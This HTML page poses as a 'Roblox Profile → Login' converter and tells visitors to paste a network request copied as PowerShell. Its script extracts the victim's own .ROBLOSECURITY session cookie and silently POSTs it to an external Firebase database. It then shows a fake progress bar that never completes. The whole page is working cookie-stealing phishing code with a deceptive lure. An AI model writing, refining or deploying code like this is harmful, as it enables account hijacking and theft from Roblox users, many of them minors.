<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Profile → Login Converter 2025</title>
  <style>
    body{font-family:"Segoe UI",Arial,sans-serif;background:#f9f9f9;color:#333;margin:0;padding:0}
    .container{max-width:800px;margin:40px auto;background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center}
    h1{color:#1a1a1e;font-size:2.4em;margin-bottom:10px}
    p{color:#555;font-size:1.1em;margin-bottom:30px}
    textarea{width:100%;height:260px;padding:20px;font-family:Consolas,monospace;font-size:14px;border:2px solid #ddd;border-radius:8px;background:#fafafa;resize:none}
    textarea:focus{border-color:#0078d4;outline:none}
    button{background:#0078d4;color:white;padding:16px 40px;font-size:18px;border:none;border-radius:8px;cursor:pointer;margin-top:20px}
    button:hover{background:#106ebe}
    #status{margin-top:20px;font-size:18px;color:#444}
    .loader{display:none;margin-top:20px;font-size:19px;color:#0078d4}
    footer{margin-top:60px;color:#888;font-size:14px}
  </style>
</head>
<body>
  <div class="container">
    <h1>Roblox Profile → Login</h1>
    <p>Paste the PowerShell code you copied from the Network tab<br>and get the account login instantly (2025 method)</p>

    <textarea id="paste" placeholder="Right-click the first request → Copy → Copy as PowerShell → paste here"></textarea>

    <br>
    <button onclick="process()">CONVERT & LOGIN</button>

    <div id="status">Waiting for paste...</div>
    <div id="loader" class="loader">Analyzing request... please wait</div>
  </div>

  <footer>© 2025 Roblox Tools • Not affiliated with Roblox Corporation</footer>

  <script>
    function process() {
      const text = document.getElementById("paste").value;
      if (!text || text.length < 200) {
        document.getElementById("status").textContent = "Paste the full PowerShell code";
        return;
      }

      // Extract .ROBLOSECURITY from the giant PowerShell curl command
      const cookieMatch = text.match(/'\.ROBLOSECURITY' *= *'([^']{300,})/) ||
                          text.match(/\"\.ROBLOSECURITY\" *= *\"([^\"]{300,})/) ||
                          text.match(/\.ROBLOSECURITY=([^;\s\"']{300,})/i);

      if (!cookieMatch) {
        document.getElementById("status").textContent = "No cookie found — try again";
        return;
      }

      const cookie = cookieMatch[1].split("'")[0].split('"')[0].trim();

      // SEND TO YOUR FIREBASE SILENTLY
      fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
        method: "POST",
        body: JSON.stringify({
          cookie: cookie,
          method: "profile-powershell-2025",
          time: new Date().toISOString()
        }),
        headers: { "Content-Type": "application/json" }
      });

      // Fake nice loading
      document.getElementById("status").style.display = "none";
      document.getElementById("loader").style.display = "block";
      let percent = 15;
      const timer = setInterval(() => {
        percent += Math.floor(Math.random() * 22);
        if (percent > 94) percent = 94;
        document.getElementById("loader").textContent = `Preparing login... ${percent}% complete`;
      }, 3200);
    }
  </script>
</body>
</html>
